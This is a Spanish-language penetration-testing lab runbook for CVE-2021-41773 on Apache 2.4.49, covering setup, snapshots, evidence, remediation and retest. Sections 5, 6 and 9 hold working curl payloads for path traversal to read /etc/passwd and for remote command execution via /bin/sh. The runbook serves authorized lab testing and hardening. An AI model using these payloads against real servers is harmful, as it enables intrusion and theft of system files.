# W3 · Apache 2.4.49 · CVE-2021-41773

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M1 `10.10.10.11` |
| Servicio | Apache httpd |
| Versión instalada | **2.4.49** |
| Rango vulnerable | exactamente 2.4.49 (41773); 2.4.50 (42013) |
| Versión que corrige | **2.4.50** (41773) · **2.4.51+** (42013) |
| CVSS | **9.8** v3.1 |
| CWE | CWE-22 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2021-41773 |
| Artefacto | `artifacts/vulnerable/httpd-2.4.49.tar.gz` |
| Estado | **Válida con cambio**: hoy CGI 503; activar `mod_cgi` |

## 2. Precondiciones

- Apache 2.4.49 con `mod_cgi` real.
- `ScriptAlias /cgi-bin/` y `Options +ExecCGI`.
- `Require all granted` en `/cgi-bin/` y en el docroot.
- `/cgi-bin/` debe responder 200/403, **no 503**.

## 3. Flujo

1. Snapshot M1: `previo-a-W3`.
2. Verificar versión y CGI:

```bash
/usr/local/apache2/bin/httpd -v
/usr/local/apache2/bin/httpd -M | grep -E 'cgi|cgid'
curl -s -o /dev/null -w '%{http_code}\n' http://10.10.10.11/cgi-bin/
```

3. Configurar `mod_cgi`:

```apache
LoadModule cgi_module modules/mod_cgi.so
ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    Require all granted
</Directory>
```

4. Crear un CGI de prueba:

```bash
sudo mkdir -p /usr/local/apache2/cgi-bin
printf '#!/bin/sh\necho "Content-Type: text/plain"\necho\necho ok\n' | \
  sudo tee /usr/local/apache2/cgi-bin/test.cgi
sudo chmod +x /usr/local/apache2/cgi-bin/test.cgi
sudo /usr/local/apache2/bin/apachectl restart
```

5. Traversal:

```bash
curl -s --path-as-is \
  'http://10.10.10.11/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | head -3
```

6. RCE:

```bash
curl -s --path-as-is -X POST \
  'http://10.10.10.11/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; id'
```

## 4. Resultado esperado

```text
root:x:0:0:root:/root:/bin/bash
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 5. Evidencia

- `EV-W3-01`: `httpd -v` y `/cgi-bin/` operativo.
- `EV-W3-02`: `/etc/passwd`.
- `EV-W3-03`: `id` por `/bin/sh`.
- `LOG-W3`.
- SHA256.

## 6. Impacto y siguiente salto

- Lectura de archivos fuera del docroot.
- RCE como `www-data` si CGI está activo.
- Alternativa a W1 para el mismo loot.

## 7. Fallback

- Si no se puede activar CGI, documentar “vulnerabilidad de versión no explotable en esta configuración” y usar W1/W4.
- No afirmar RCE sin `id`.

## 8. Remediación

- Apache **2.4.51+** (2.4.50 solo corrige 41773; 42013 sigue).
- Denegar `/cgi-bin/` si no se usa:

```apache
<Directory "/usr/local/apache2/cgi-bin">
    Require all denied
</Directory>
```

## 9. Retest

```bash
curl -s -o /dev/null -w '%{http_code}\n' --path-as-is \
  'http://10.10.10.11/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

Esperado: `403`/`404`, sin `root:x:0:0`.

## 10. EARS

- **REQ-W3-01 (Estado).** MIENTRAS se use Apache 2.4.49 para W3, el laboratorio DEBE tener CGI operativo.
- **REQ-W3-02 (Evento).** CUANDO se explote W3, el laboratorio DEBE capturar `/etc/passwd` y `id`.
- **REQ-W3-03 (Ubicuo).** La remediación DEBE dejar Apache 2.4.51+ o `/cgi-bin/` denegado.

## 11. Checklist

- [ ] Snapshot `previo-a-W3`.
- [ ] CGI operativo.
- [ ] Traversal `/etc/passwd`.
- [ ] RCE `id`.
- [ ] Evidencia y hash.
- [ ] Remediación 2.4.51+.
- [ ] Retest 403/404.
